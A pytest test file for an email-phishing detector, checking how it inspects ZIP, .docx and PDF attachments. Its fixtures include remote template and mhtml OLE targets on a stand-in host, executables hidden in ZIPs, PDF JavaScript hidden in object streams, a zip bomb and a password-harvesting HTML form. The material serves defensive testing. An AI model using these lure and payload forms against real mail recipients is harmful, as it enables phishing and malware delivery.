"""Container structure: what a ZIP lists, what a .docx loads, what a PDF links.

The boundary under test is as important as the findings: structure is read in
memory under size caps, nothing is extracted or run, and a file that cannot be
read this way produces no finding and no exception.
"""
import io
import zipfile
import zlib
from email.message import EmailMessage
from types import SimpleNamespace

import pytest

from detector import analyzer, config, documents, iocs, parser
from detector.checks import attachment_deep
from detector.parser import Attachment
from detector.scoring import SOFT_IDS, STACK_IDS

CTX = analyzer.build_context(config=config.DEFAULTS)

RELS_NS = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"


def make_zip(files, encrypted=False) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, data in files.items():
            zf.writestr(name, data)
    raw = bytearray(buf.getvalue())
    if encrypted:
        # zipfile cannot write encrypted archives; set the "encrypted" bit of
        # every central-directory entry, which is all a directory listing reads.
        at = raw.find(b"PK\x01\x02")
        while at >= 0:
            raw[at + 8] |= 0x01
            at = raw.find(b"PK\x01\x02", at + 4)
    return bytes(raw)


def rel(kind, target, external=True):
    return ('<Relationship Id="r1" Type="' + RELS_NS + "/" + kind + '" Target="'
            + target + '"' + (' TargetMode="External"' if external else "") + "/>")


def make_docx(*relationships, rels_path="word/_rels/document.xml.rels") -> bytes:
    return make_zip({
        "[Content_Types].xml": "<Types/>",
        "word/document.xml": "<w:document/>",
        rels_path: "<Relationships>" + "".join(relationships) + "</Relationships>",
    })


def objstm(body: bytes) -> bytes:
    packed = zlib.compress(body)
    return (b"5 0 obj\n<< /Type /ObjStm /N 1 /First 4 /Filter /FlateDecode /Length "
            + str(len(packed)).encode() + b" >>\nstream\n" + packed
            + b"\nendstream\nendobj\n")


def make_pdf(*objects: bytes) -> bytes:
    return b"%PDF-1.7\n" + b"".join(objects) + b"%%EOF"


def att(name, data, ctype="application/octet-stream"):
    return Attachment(filename=name, content_type=ctype, size=len(data), payload=data)


def deep(*atts):
    return attachment_deep.run(SimpleNamespace(attachments=list(atts)))


def ids(indicators):
    return [i.id for i in indicators]


def mail(*attachments, html="<p>Ekte.</p>"):
    m = EmailMessage()
    m["From"] = "Muhasebe <muhasebe@tedarikci.example>"
    m["To"] = "ali@alici.com"
    m["Subject"] = "Belge"
    m["Received"] = ("from mail.example.net ([93.184.216.34]) by mx.alici.com "
                     "with ESMTPS; Mon, 2 Nov 2026 10:00:00 +0300")
    m.set_content("Ekte.")
    m.add_alternative(html, subtype="html")
    for name, data, (main, sub) in attachments:
        m.add_attachment(data, maintype=main, subtype=sub, filename=name)
    return parser.parse_bytes(m.as_bytes())


PDF_TYPE = ("application", "pdf")
ZIP_TYPE = ("application", "zip")
DOCX_TYPE = ("application",
             "vnd.openxmlformats-officedocument.wordprocessingml.document")


# -- ZIP directory -----------------------------------------------------------


def test_zip_members_lists_names_without_extracting():
    members = documents.zip_members(make_zip({"a/fatura.pdf.exe": b"MZ", "b.txt": b"x"}))
    assert [(m.name, m.encrypted) for m in members] == [("a/fatura.pdf.exe", False),
                                                        ("b.txt", False)]


@pytest.mark.parametrize("inner", ["fatura.pdf.exe", "belgeler/kur.js", "rapor.lnk",
                                   "odeme.iso", "FATURA.EXE.", "x\\y\\setup.vbs"])
def test_executable_inside_a_zip_is_hard_evidence(inner):
    found = deep(att("fatura.zip", make_zip({inner: b"x", "oku.txt": b"x"})))
    assert ids(found) == ["archive_dangerous_member"]
    assert "archive_dangerous_member" not in SOFT_IDS
    assert "fatura.zip" in found[0].evidence


def test_evidence_names_the_inner_file_and_counts_the_rest():
    files = {"a.exe": b"x", "b.js": b"x", "c.vbs": b"x", "d.bat": b"x", "e.cmd": b"x"}
    evidence = deep(att("p.zip", make_zip(files)))[0].evidence
    assert "a.exe, b.js, c.vbs" in evidence and "(+2)" in evidence


def test_the_zip_is_recognised_by_content_not_by_name():
    found = deep(att("fatura.pdf", make_zip({"fatura.exe": b"x"})))
    assert ids(found) == ["archive_dangerous_member"]


@pytest.mark.parametrize("files", [
    {"fatura.pdf": b"x", "notlar.txt": b"x", "tablo.xlsx": b"x"},
    {"site/index.html": b"<html/>", "site/logo.svg": b"<svg/>"},     # saved pages
    {"foto1.jpg": b"x", "foto2.png": b"x"},
])
def test_ordinary_zip_contents_raise_nothing(files):
    assert deep(att("belgeler.zip", make_zip(files))) == []


def test_password_protected_zip_is_a_soft_carrier_signal():
    found = deep(att("bordro.zip", make_zip({"bordro.pdf": b"x"}, encrypted=True)))
    assert ids(found) == ["archive_encrypted"]
    assert "archive_encrypted" in SOFT_IDS and "archive_encrypted" in STACK_IDS


def test_encryption_does_not_hide_the_names():
    found = deep(att("fatura.zip", make_zip({"fatura.exe": b"x"}, encrypted=True)))
    assert ids(found) == ["archive_dangerous_member", "archive_encrypted"]


def test_office_documents_are_not_treated_as_archives():
    docx = make_zip({"[Content_Types].xml": "<Types/>", "word/document.xml": "<x/>",
                     "word/embeddings/oleObject1.bin": b"x"})
    assert deep(att("rapor.docx", docx)) == []
    odt = make_zip({"mimetype": "application/vnd.oasis.opendocument.text",
                    "content.xml": "<x/>"})
    assert deep(att("rapor.odt", odt)) == []


@pytest.mark.parametrize("data", [b"", b"PK\x03\x04xx", b"PK" + b"\x00" * 200,
                                  b"not a zip at all"])
def test_unreadable_zip_is_no_finding_and_no_exception(data):
    assert documents.zip_members(data) is None
    assert documents.ooxml_external(data) == ()
    assert deep(att("x.zip", data)) == []


# -- OOXML relationships -----------------------------------------------------


@pytest.mark.parametrize("kind, target, path", [
    ("attachedTemplate", "https://evil.example/t.dotm", "word/_rels/settings.xml.rels"),
    ("attachedTemplate", "\\\\evil.example\\share\\t.dotm", "word/_rels/settings.xml.rels"),
    ("oleObject", "mhtml:https://evil.example/x.html!x-usc:https://evil.example/x.html",
     "word/_rels/document.xml.rels"),
    ("frame", "http://evil.example/f.html", "word/_rels/webSettings.xml.rels"),
])
def test_document_that_loads_a_remote_template_or_object(kind, target, path):
    found = deep(att("teklif.docx", make_docx(rel(kind, target), rels_path=path)))
    assert ids(found) == ["remote_template"]
    assert "evil.example" in found[0].evidence


@pytest.mark.parametrize("relationship", [
    # Word writes the local template of nearly every document like this.
    rel("attachedTemplate", "file:///C:\\Users\\ali\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm"),
    rel("attachedTemplate", "Sablon.dotx"),
    rel("hyperlink", "https://example.com/"),             # waits for a click
    rel("image", "https://example.com/logo.png"),
    rel("attachedTemplate", "https://evil.example/t.dotm", external=False),
])
def test_local_templates_and_plain_links_are_not_template_injection(relationship):
    assert deep(att("rapor.docx", make_docx(relationship))) == []


def test_ooxml_external_reports_kind_and_unescaped_target():
    docx = make_docx(rel("hyperlink", "https://example.com/a?x=1&amp;y=2"),
                     rel("hyperlink", "#bolum1", external=False))
    assert documents.ooxml_external(docx) == (("hyperlink", "https://example.com/a?x=1&y=2"),)


def test_a_plain_zip_has_no_relationships():
    assert documents.ooxml_external(make_zip({"word/_rels/document.xml.rels":
                                              rel("hyperlink", "https://x.example/")})) == ()


# -- PDF ---------------------------------------------------------------------


def test_pdf_urls_from_plain_objects():
    pdf = make_pdf(b"1 0 obj\n<< /S /URI /URI (https://evil.example/giris) >>\nendobj\n",
                   b"2 0 obj\n<< /S /URI /URI(http://two.example/a\\(1\\)) >>\nendobj\n")
    assert documents.pdf_urls(pdf) == ["https://evil.example/giris",
                                       "http://two.example/a(1)"]


def test_pdf_urls_from_hex_strings():
    pdf = make_pdf(b"1 0 obj\n<< /URI <" + b"https://evil.example/h".hex().encode()
                   + b"> >>\nendobj\n")
    assert documents.pdf_urls(pdf) == ["https://evil.example/h"]


def test_pdf_urls_inside_a_deflated_object_stream():
    pdf = make_pdf(objstm(b"1 0 << /S /URI /URI (https://evil.example/gizli) >>"))
    assert b"evil.example" not in pdf                   # invisible to a raw scan
    assert documents.pdf_urls(pdf) == ["https://evil.example/gizli"]


def test_only_object_streams_are_inflated():
    packed = zlib.compress(b"BT (see https://not-a-link.example) Tj ET /URI (https://x.example/)")
    page = (b"7 0 obj\n<< /Filter /FlateDecode /Length " + str(len(packed)).encode()
            + b" >>\nstream\n" + packed + b"\nendstream\nendobj\n")
    assert documents.pdf_object_streams(make_pdf(page)) == b""
    assert documents.pdf_urls(make_pdf(page)) == []


def test_inflation_is_capped():
    bomb = make_pdf(objstm(b"\x00" * (documents.MAX_OBJSTM_BYTES * 4)))
    assert len(bomb) < 100_000
    assert len(documents.pdf_object_streams(bomb)) == documents.MAX_OBJSTM_BYTES


@pytest.mark.parametrize("pdf", [
    b"", b"%PDF-1.7\n%%EOF",
    make_pdf(b"5 0 obj\n<< /Type /ObjStm /Filter /FlateDecode >>\nstream\nnot deflate\nendstream\n"),
    make_pdf(b"5 0 obj\n<< /Type /ObjStm /Filter /FlateDecode >>\nstream\n"),
])
def test_unreadable_pdf_structure_is_nothing_found(pdf):
    assert documents.pdf_urls(pdf) == []


def test_javascript_hidden_in_an_object_stream_is_found():
    hidden = make_pdf(objstm(b"1 0 << /S /JavaScript /JS (app.alert(1)) >>"))
    assert b"/JavaScript" not in hidden
    assert ids(deep(att("fatura.pdf", hidden))) == ["pdf_active_content"]
    quiet = make_pdf(objstm(b"1 0 << /Type /Catalog /Pages 2 0 R >>"))
    assert deep(att("fatura.pdf", quiet)) == []


# -- links inside attachments reach the URL checks ---------------------------


def test_pdf_link_becomes_a_link_with_its_source():
    pdf = make_pdf(objstm(b"1 0 << /S /URI /URI (https://paypa1.com/giris) >>"))
    email = mail(("fatura.pdf", pdf, PDF_TYPE))
    assert [(l.href, l.source) for l in email.links] == [
        ("https://paypa1.com/giris", "fatura.pdf")]
    r = analyzer.analyze(email, ctx=CTX)
    lookalike = [i for i in r.indicators if i.id == "lookalike_domain"]
    assert lookalike and lookalike[0].evidence.startswith("Ek 'fatura.pdf' icindeki link")
    assert r.verdict == "medium"
    assert "https://paypa1.com/giris" in iocs.collect(email).urls


def test_same_mail_without_the_pdf_link_is_low():
    email = mail(("fatura.pdf", make_pdf(b"1 0 obj\n<<>>\nendobj\n"), PDF_TYPE))
    assert email.links == []
    assert analyzer.analyze(email, ctx=CTX).verdict == "low"


def test_docx_hyperlink_reaches_the_url_checks():
    email = mail(("teklif.docx", make_docx(rel("hyperlink", "https://bit.ly/3xYz")),
                  DOCX_TYPE))
    assert [(l.href, l.source) for l in email.links] == [
        ("https://bit.ly/3xYz", "teklif.docx")]
    shortener = [i for i in analyzer.analyze(email, ctx=CTX).indicators
                 if i.id == "url_shortener"]
    assert shortener and "teklif.docx" in shortener[0].evidence


def test_html_attachment_links_and_form_targets_reach_the_url_checks():
    page = (b'<html><form action="https://paypa1.com/collect">'
            b'<input type="password"></form>'
            b'<a href="https://example.com/yardim">Yardim</a></html>')
    email = mail(("giris.html", page, ("text", "html")))
    assert {(l.href, l.source) for l in email.links} == {
        ("https://paypa1.com/collect", "giris.html"),
        ("https://example.com/yardim", "giris.html")}
    found = {i.id for i in analyzer.analyze(email, ctx=CTX).indicators}
    assert {"lookalike_domain", "html_attachment_form", "dangerous_attachment"} <= found


def test_link_already_in_the_body_is_not_duplicated():
    pdf = make_pdf(b"1 0 obj\n<< /URI (https://example.com/fatura) >>\nendobj\n")
    email = mail(("fatura.pdf", pdf, PDF_TYPE),
                 html='<a href="https://example.com/fatura">Fatura</a>')
    assert [(l.href, l.source) for l in email.links] == [
        ("https://example.com/fatura", "")]


def test_non_web_targets_are_not_links():
    pdf = make_pdf(b"1 0 obj\n<< /URI (mailto:a@example.com) >>\nendobj\n",
                   b"2 0 obj\n<< /URI (file:///C:/x.pdf) >>\nendobj\n",
                   b"3 0 obj\n<< /URI (www.example.com/a) >>\nendobj\n")
    assert [l.href for l in mail(("a.pdf", pdf, PDF_TYPE)).links] == [
        "http://www.example.com/a"]


def test_ordinary_document_links_stay_quiet():
    pdf = make_pdf(b"1 0 obj\n<< /URI (https://www.example.com/iletisim) >>\nendobj\n")
    r = analyzer.analyze(mail(("fatura.pdf", pdf, PDF_TYPE)), ctx=CTX)
    assert r.indicators == [] and r.verdict == "low"


# -- end to end --------------------------------------------------------------


def test_zip_with_an_executable_is_medium_and_a_clean_zip_is_low():
    bad = mail(("fatura.zip", make_zip({"fatura.pdf.exe": b"x"}), ZIP_TYPE))
    r = analyzer.analyze(bad, ctx=CTX)
    assert {"archive_attachment", "archive_dangerous_member"} <= {i.id for i in r.indicators}
    assert r.verdict == "medium"
    clean = mail(("belgeler.zip", make_zip({"fatura.pdf": b"x"}), ZIP_TYPE))
    assert analyzer.analyze(clean, ctx=CTX).verdict == "low"


def test_remote_template_docx_is_medium():
    docx = make_docx(rel("attachedTemplate", "https://evil.example/t.dotm"),
                     rels_path="word/_rels/settings.xml.rels")
    r = analyzer.analyze(mail(("teklif.docx", docx, DOCX_TYPE)), ctx=CTX)
    assert "remote_template" in {i.id for i in r.indicators}
    assert r.verdict == "medium"
